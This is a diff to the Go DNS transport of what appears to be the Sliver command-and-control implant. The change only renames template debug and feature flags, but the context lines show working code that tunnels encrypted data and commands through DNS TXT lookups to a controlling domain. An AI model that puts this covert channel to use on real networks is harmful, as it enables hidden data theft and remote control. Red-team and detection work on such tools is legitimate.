@@ -18,7 +18,7 @@ package transports
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// {{if .DNSc2Enabled}}
+// {{if .Config.DNSc2Enabled}}
 
 import (
 	"bytes"
@@ -33,7 +33,7 @@ import (
 	"fmt"
 	"math"
 
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
@@ -109,7 +109,7 @@ func isReplayAttack(ciphertext []byte) bool {
 	replayMutex.Lock()
 	defer replayMutex.Unlock()
 	if _, ok := (*replay)[digest]; ok {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("WARNING: Replay attack detected")
 		// {{end}}
 		return true
@@ -121,12 +121,12 @@ func isReplayAttack(ciphertext []byte) bool {
 // --------------------------- DNS SESSION SEND ---------------------------
 
 func dnsLookup(domain string) (string, error) {
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[dns] lookup -> %s", domain)
 	// {{end}}
 	txts, err := net.LookupTXT(domain)
 	if err != nil || len(txts) == 0 {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[!] failure -> %s", domain)
 		// {{end}}
 		return "", err
@@ -139,7 +139,7 @@ func dnsSend(parentDomain string, msgType string, sessionID string, data []byte)
 
 	encoded := dnsEncodeToString(data)
 	size := int(math.Ceil(float64(len(encoded)) / float64(dnsSendDomainStep)))
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("Encoded message length is: %d (size = %d)", len(encoded), size)
 	// {{end}}
 
@@ -157,7 +157,7 @@ func dnsSend(parentDomain string, msgType string, sessionID string, data []byte)
 	//                Max parent domain: ~20 chars
 	//
 	for index := 0; index < size; index++ {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Sending domain #%d of %d", index+1, size)
 		// {{end}}
 		start := index * dnsSendDomainStep
@@ -165,13 +165,13 @@ func dnsSend(parentDomain string, msgType string, sessionID string, data []byte)
 		if len(encoded) <= stop {
 			stop = len(encoded)
 		}
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Send data[%d:%d] %d bytes", start, stop, len(encoded[start:stop]))
 		// {{end}}
 		data := encoded[start:stop] // Total data we're about to send
 
 		subdomains := int(math.Ceil(float64(len(data)) / dnsSendDomainSeg))
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Subdata subdomains: %d", subdomains)
 		// {{end}}
 
@@ -182,12 +182,12 @@ func dnsSend(parentDomain string, msgType string, sessionID string, data []byte)
 			if len(data) < dataStop {
 				dataStop = len(data)
 			}
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("Subdata #%d [%d:%d]: %#v", dataIndex, dataStart, dataStop, data[dataStart:dataStop])
 			// {{end}}
 			subdata = append(subdata, data[dataStart:dataStop])
 		}
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Encoded subdata: %#v", subdata)
 		// {{end}}
 
@@ -238,12 +238,12 @@ func dnsStartSession(parentDomain string) (string, AESKey, error) {
 	if err != nil {
 		return "", AESKey{}, errors.New("Failed to start new DNS session (sessionInitMsg send failed)")
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("Encrypted session id = %s", encryptedSessionID)
 	// {{end}}
 	encryptedSessionIDData, err := base64.RawStdEncoding.DecodeString(encryptedSessionID)
 	if err != nil || isReplayAttack(encryptedSessionIDData) {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Session ID decode error %v", err)
 		// {{end}}
 		return "", AESKey{}, errors.New("Failed to decode session id")
@@ -260,7 +260,7 @@ func dnsStartSession(parentDomain string) (string, AESKey, error) {
 func dnsGetServerPublicKey(dnsParent string) *rsa.PublicKey {
 	pubKeyPEM, err := LookupDomainKey(consts.SliverName, dnsParent)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to fetch domain key %v", err)
 		// {{end}}
 		return nil
@@ -268,12 +268,12 @@ func dnsGetServerPublicKey(dnsParent string) *rsa.PublicKey {
 
 	pubKeyBlock, _ := pem.Decode([]byte(pubKeyPEM))
 	if pubKeyBlock == nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("failed to parse certificate PEM")
 		// {{end}}
 		return nil
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("RSA Fingerprint: %s", fingerprintSHA256(pubKeyBlock))
 	// {{end}}
 
@@ -283,7 +283,7 @@ func dnsGetServerPublicKey(dnsParent string) *rsa.PublicKey {
 		return cert.PublicKey.(*rsa.PublicKey)
 	}
 
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("Invalid certificate %v", err)
 	// {{end}}
 	return nil
@@ -297,14 +297,14 @@ func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
 
 	txt, err := dnsLookup(domain)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Error fetching server certificate %v", err)
 		// {{end}}
 		return nil, err
 	}
 	certPEM, err := base64.RawStdEncoding.DecodeString(txt)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Error decoding certificate %v", err)
 		// {{end}}
 		return nil, err
@@ -318,7 +318,7 @@ func dnsSessionSendEnvelope(parentDomain string, sessionID string, sessionKey AE
 
 	envelopeData, err := proto.Marshal(envelope)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to encode envelope %v", err)
 		// {{end}}
 		return
@@ -326,7 +326,7 @@ func dnsSessionSendEnvelope(parentDomain string, sessionID string, sessionKey AE
 
 	encryptedEnvelope, err := GCMEncrypt(sessionKey, envelopeData)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to encrypt session envelope %v", err)
 		// {{end}}
 		return
@@ -334,7 +334,7 @@ func dnsSessionSendEnvelope(parentDomain string, sessionID string, sessionKey AE
 
 	_, err = dnsSend(parentDomain, sessionEnvelopeMsg, sessionID, encryptedEnvelope)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to send session envelope %v", err)
 		// {{end}}
 	}
@@ -352,14 +352,14 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 			domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, sessionID, sessionPollingMsg, parentDomain)
 			txt, err := dnsLookup(domain)
 			if err != nil {
-				// {{if .Debug}}
+				// {{if .Config.Debug}}
 				log.Printf("Lookup error %v", err)
 				// {{end}}
 			}
 			if txt == "0" {
 				continue
 			}
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("Poll returned new block(s): %#v", txt)
 			// {{end}}
 
@@ -369,7 +369,7 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 			}
 			pollData, err := GCMDecrypt(sessionKey, rawTxt)
 			if err != nil {
-				// {{if .Debug}}
+				// {{if .Config.Debug}}
 				log.Printf("Failed to decrypt poll response")
 				// {{end}}
 				break
@@ -377,7 +377,7 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 			dnsPoll := &pb.DNSPoll{}
 			err = proto.Unmarshal(pollData, dnsPoll)
 			if err != nil {
-				// {{if .Debug}}
+				// {{if .Config.Debug}}
 				log.Printf("Invalid poll response")
 				// {{end}}
 				break
@@ -399,14 +399,14 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 func getSessionEnvelope(parentDomain string, sessionKey AESKey, blockPtr *pb.DNSBlockHeader) *pb.Envelope {
 	blockData, err := getBlock(parentDomain, blockPtr.ID, fmt.Sprintf("%d", blockPtr.Size))
 	if err != nil || isReplayAttack(blockData) {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to fetch block with id = %s", blockPtr.ID)
 		// {{end}}
 		return nil
 	}
 	envelopeData, err := GCMDecrypt(sessionKey, blockData)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to decrypt block with id = %s (%v)", blockPtr.ID, err)
 		// {{end}}
 		return nil
@@ -414,7 +414,7 @@ func getSessionEnvelope(parentDomain string, sessionKey AESKey, blockPtr *pb.DNS
 	envelope := &pb.Envelope{}
 	err = proto.Unmarshal(envelopeData, envelope)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message %v", err)
 		// {{end}}
 		return nil
@@ -468,7 +468,7 @@ func getBlock(parentDomain string, blockID string, size string) ([]byte, error) 
 
 	msgData, err := base64.RawStdEncoding.DecodeString(strings.Join(msg, ""))
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to decode block")
 		// {{end}}
 		return nil, errors.New("Failed to decode block")
@@ -477,7 +477,7 @@ func getBlock(parentDomain string, blockID string, size string) ([]byte, error) 
 	nonce := dnsNonce(nonceStdSize)
 	go func() {
 		domain := fmt.Sprintf("%s.%s._cb.%s", nonce, reasm.ID, parentDomain)
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[dns] lookup -> %s", domain)
 		// {{end}}
 		net.LookupTXT(domain)
@@ -491,12 +491,12 @@ func fetchBlockSegments(parentDomain string, reasm *BlockReassembler, index int,
 	defer wg.Done()
 	nonce := dnsNonce(nonceStdSize)
 	domain := fmt.Sprintf("_%s.%d.%d.%s.%s.%s", nonce, start, stop, reasm.ID, blockReqMsg, parentDomain)
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[dns] fetch -> %s", domain)
 	// {{end}}
 	txt, err := dnsLookup(domain)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to fetch blocks %v", err)
 		// {{end}}
 		return
@@ -544,7 +544,7 @@ var sliverBase32 = base32.NewEncoding(base32Alphabet)
 // EncodeToString encodes the given byte slice in base32
 func dnsEncodeToString(input []byte) string {
 	encoded := sliverBase32.EncodeToString(input)
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[base32] %#v", encoded)
 	// {{end}}
 	return strings.TrimRight(encoded, "=")
